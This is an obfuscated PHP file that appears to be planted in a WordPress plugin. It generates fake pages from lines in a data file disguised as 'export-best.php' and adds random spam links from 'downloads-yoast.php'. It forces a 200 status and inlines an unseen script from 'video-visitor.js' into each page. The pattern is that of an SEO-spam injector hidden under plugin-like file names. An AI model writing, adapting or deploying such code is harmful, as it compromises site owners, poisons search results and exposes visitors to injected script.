<?php
$ol3UZ = intval(get_query_var('nvtzht'));

if ($ol3UZ < 1 || $ol3UZ > 5951) return;
$xZy1qGG = file(plugin_dir_path(__FILE__).'export-best.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$vaY1icGZ = explode(';', $xZy1qGG[$ol3UZ]);
if (count($vaY1icGZ) < 2) return;
$rbvqGZDX = $vaY1icGZ[0];
$rO5u9  = $vaY1icGZ[1];
$fmQv1 = $vaY1icGZ[2];
$i7zGV  = $vaY1icGZ[3];
$rslEsBg0f = $vaY1icGZ[4];
set_query_var('eexibghp', $rbvqGZDX);

$ixSvaML5 = '';
$kA5op = plugin_dir_path(__FILE__).'downloads-yoast.php';
if (is_file($kA5op)) {
	$vlZWlO = file($kA5op, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($vlZWlO);
	shuffle($vlZWlO);
	$bMw1IIwY0h = mt_rand(2, 5);
	if (count($vlZWlO) > $bMw1IIwY0h) {
		for ($lwj3Auh = 0; $lwj3Auh < $bMw1IIwY0h; $lwj3Auh++) {
			$f5zRxb = array_shift($vlZWlO);
			$ixSvaML5 .= '<p><a href="'.$f5zRxb.'">'.$f5zRxb.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $rbvqGZDX; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $rO5u9 . "</p>\n";
				if (strlen($i7zGV) > 0) echo "<p>" . $i7zGV . "</p>\n";
				if (strlen($fmQv1) > 0) echo "<p>" . $fmQv1 . "</p>\n";
				if (strlen($rslEsBg0f) > 0) echo '<p><a href="#"><img src="'.$rslEsBg0f.'"></a>' . "</p>\n";
				echo $ixSvaML5;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$u8bxEJ = plugin_dir_path(__FILE__) . 'video-visitor.js';
if (is_file($u8bxEJ)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($u8bxEJ);
	echo '</script>';
}
get_footer();
?>
